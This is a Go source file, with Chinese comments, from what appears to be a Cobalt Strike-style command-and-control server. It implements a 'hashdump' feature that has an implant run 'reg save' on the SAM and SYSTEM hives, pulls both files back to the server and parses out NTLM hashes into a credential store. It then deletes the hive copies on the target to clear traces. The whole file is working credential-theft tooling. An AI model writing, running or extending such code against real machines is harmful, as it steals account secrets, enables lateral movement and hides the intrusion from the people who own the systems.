// csdev :: v2_hashdump.go  --  hashdump 的服务端编排
//
// 完整链路 (对标 CS 的 hashdump):
//   1. 目标侧导出 hive: reg save HKLM\SAM / HKLM\SYSTEM 到固定路径
//   2. 复用现有 FILE_CHUNK 分块通道把两个 hive 回传 (植入体的传输是串行的,
//      第二个下载任务会被自动排队, 不需要额外的调度)
//   3. 两个 hive 到齐后离线解析 (regf.go + hashdump.go) 出不依赖目标机工具的
//      NTLM 哈希, 按 CredK=2 (哈希) 入凭据库, 并清掉目标机上的 hive 残留
//
// 为什么不用 %TEMP%: 回传走的是植入体的原生 CreateFileA, 不展开环境变量;
// 而且中文系统下 %TEMP% 可能含中文用户名 (ANSI 编码), 下载任务会打不开文件。
// C:\Windows\Temp 是纯 ASCII 且管理员可写 —— hashdump 本来就需要管理员。
package main

import (
	"fmt"
	"path/filepath"
	"strings"
	"time"
)

const (
	hdSamRemote = `C:\Windows\Temp\csdev_s.hiv`
	hdSysRemote = `C:\Windows\Temp\csdev_y.hiv`
	hdSamName   = "csdev_s.hiv"
	hdSysName   = "csdev_y.hiv"

	// 超过这个时间还没凑齐两个 hive 就认为这一轮失败了 (例如目标机
	// reg save 因权限失败, 下载任务报"无法打开文件", 永远等不到分块)
	hdTimeout = 3 * time.Minute
)

// hashdumpRun 是一轮 hashdump 的会话内状态
type hashdumpRun struct {
	startAt time.Time
	samData []byte
	sysData []byte
	samPath string
	sysPath string
}

// isHashdumpCommand 判定是否是 hashdump 及其别名
func isHashdumpCommand(cmd string) bool {
	f := strings.Fields(strings.TrimSpace(cmd))
	if len(f) == 0 {
		return false
	}
	switch strings.ToLower(f[0]) {
	case "hashdump", "sam":
		return true
	}
	return false
}

// v2SendHashdump 下发一轮 hashdump
func v2SendHashdump(sess *V2Session, userCmd string) (string, error) {
	f := strings.Fields(strings.TrimSpace(userCmd))
	if len(f) > 1 {
		return "", fmt.Errorf("hashdump 不接受参数 (收到 %q)", strings.Join(f[1:], " "))
	}

	sess.hdMu.Lock()
	if sess.hdRun != nil {
		if time.Since(sess.hdRun.startAt) < hdTimeout {
			sess.hdMu.Unlock()
			return "", fmt.Errorf("上一轮 hashdump 还在等待 hive 回传 (已 %s)",
				time.Since(sess.hdRun.startAt).Round(time.Second))
		}
		logf("[!] %s 上一轮 hashdump 超时, 丢弃并重新开始", sess.ID)
	}
	sess.hdRun = &hashdumpRun{startAt: time.Now()}
	sess.hdMu.Unlock()

	// 1) 导出。两条 reg save 用 & 连接而不是 &&: 即使 SAM 失败也要把 SYSTEM
	//    的错误一并回显, 操作员才能看清到底是权限问题还是 hive 被占用。
	//    末尾的 echo 用于确认整条命令走到了最后。
	export := fmt.Sprintf(
		`reg save HKLM\SAM %s /y & reg save HKLM\SYSTEM %s /y & echo [csdev] hive export finished`,
		hdSamRemote, hdSysRemote)
	sess.enqueue(cmdExecShell, "hashdump", []byte(export))

	// 2) 立刻排两个下载任务。它们和导出命令在同一批下发, 植入体按顺序执行:
	//    导出是同步的 (cmd_shell 阻塞到子进程退出), 所以轮到下载时文件已就绪;
	//    第二个下载会因传输忙被自动压进 pending, 前一个传完再执行。
	sess.enqueue(cmdFileDL, "download", []byte(hdSamRemote))
	sess.enqueue(cmdFileDL, "download", []byte(hdSysRemote))

	sess.pushOut("[*] hashdump: 已下发 hive 导出与回传任务\r\n")
	sess.pushOut("    若目标机不是管理员, 会话输出里会出现 reg save 的 " +
		"\"ERROR: Access is denied.\", 随后下载会报 \"无法打开文件\"。\r\n")
	logf("[>] %s 下发 hashdump (导出 %s + %s 并回传)", sess.ID, hdSamRemote, hdSysRemote)
	eventLog("beacon", sess.ID, "hashdump", "开始导出并回传 SAM/SYSTEM hive")
	return "hashdump started", nil
}

// hashdumpOnDownload 在分块下载落盘后调用。若该文件属于进行中的 hashdump,
// 记下内容; 两个 hive 都到齐就交给后台 goroutine 离线解析。
func hashdumpOnDownload(sess *V2Session, remotePath string, data []byte) {
	sess.hdMu.Lock()
	run := sess.hdRun
	if run == nil {
		sess.hdMu.Unlock()
		return
	}
	base := strings.ToLower(filepath.Base(strings.ReplaceAll(remotePath, "\\", "/")))
	switch base {
	case hdSamName:
		run.samData = data
		run.samPath = remotePath
	case hdSysName:
		run.sysData = data
		run.sysPath = remotePath
	default:
		sess.hdMu.Unlock()
		return
	}
	if run.samData == nil || run.sysData == nil {
		sess.hdMu.Unlock()
		logf("[<] %s hashdump: 已收到 %s (%d 字节), 还差一个 hive",
			sess.ID, base, len(data))
		return
	}
	// 两个都到齐: 取走状态, 会话上不再持有大块内存
	sess.hdRun = nil
	sam, sys := run.samData, run.sysData
	sess.hdMu.Unlock()

	go finishHashdump(sess, sam, sys)
}

// hashdumpFinishHook 仅供测试注入, 生产路径为 nil
var hashdumpFinishHook func(*V2Session, []byte, []byte)

func finishHashdump(sess *V2Session, sam, sys []byte) {
	if hashdumpFinishHook != nil {
		hashdumpFinishHook(sess, sam, sys)
		return
	}
	v2FinishHashdump(sess, sam, sys)
}

// v2FinishHashdump 解析两个 hive 并把结果入库
func v2FinishHashdump(sess *V2Session, sam, sys []byte) {
	// 目标机上的 hive 含本机账户哈希, 解析这一步不需要它们了, 立刻清掉
	sess.enqueue(cmdExecShell, "cleanup",
		[]byte(fmt.Sprintf("del /f /q %s %s 2>nul", hdSamRemote, hdSysRemote)))

	// 先做一次魔数检查, 把"文件不是 hive"和"hive 解析失败"分开报,
	// 免得操作员以为是密码学环节出了问题
	for _, c := range []struct {
		name string
		data []byte
	}{
		{hdSamName, sam},
		{hdSysName, sys},
	} {
		if len(c.data) < 4 || string(c.data[0:4]) != "regf" {
			msg := fmt.Sprintf("[-] hashdump 失败: %s 不是注册表 hive (前 4 字节 %q, %d 字节)。"+
				"通常是目标机 reg save 失败或没有管理员权限。\r\n",
				c.name, string(c.data), len(c.data))
			sess.pushOut(msg)
			logf("[!] %s hashdump: %s", sess.ID, strings.TrimSpace(msg))
			eventLog("beacon", sess.ID, "hashdump", "hive 非法: "+c.name)
			return
		}
	}

	hashes, err := DumpSAMHashes(sam, sys)
	if err != nil {
		sess.pushOut(fmt.Sprintf("[-] hashdump 解析失败: %v\r\n", err))
		logf("[!] %s hashdump 解析失败: %v", sess.ID, err)
		eventLog("beacon", sess.ID, "hashdump", "解析失败: "+err.Error())
		return
	}
	if len(hashes) == 0 {
		sess.pushOut("[-] hashdump: hive 解析成功, 但没有取到任何账户\r\n")
		logf("[!] %s hashdump: 解析出 0 个账户", sess.ID)
		return
	}

	var b strings.Builder
	fmt.Fprintf(&b, "[+] hashdump 完成, 共 %d 个账户:\r\n", len(hashes))
	realCount := 0
	for _, h := range hashes {
		b.WriteString("    " + h.Line())
		if !h.NTReal {
			// 如实标注: 这里的哈希是标记值, 不是解出来的
			b.WriteString("   <- 无可用哈希 (Windows 的 24 字节空标记)")
		}
		b.WriteString("\r\n")
		if h.NTReal {
			// CredK=2 = 哈希 (与 report.go 的 credKindText 约定一致)
			storeAdd(Credential{
				Kind:   KindCredential,
				ID:     nextStoreID("cr"),
				SID:    sess.ID,
				CredK:  2,
				User:   h.User,
				Secret: h.NT,
				Source: "hashdump",
				TS:     time.Now().Unix(),
			})
			realCount++
		}
	}
	fmt.Fprintf(&b, "[+] 其中 %d 个账户的真实 NTLM 哈希已入凭据库\r\n", realCount)

	sess.pushOut(b.String())
	logf("[+] %s hashdump 完成: %d 个账户, %d 个真实哈希", sess.ID, len(hashes), realCount)
	eventLog("beacon", sess.ID, "hashdump",
		fmt.Sprintf("%d 个账户, %d 个已入库", len(hashes), realCount))
}
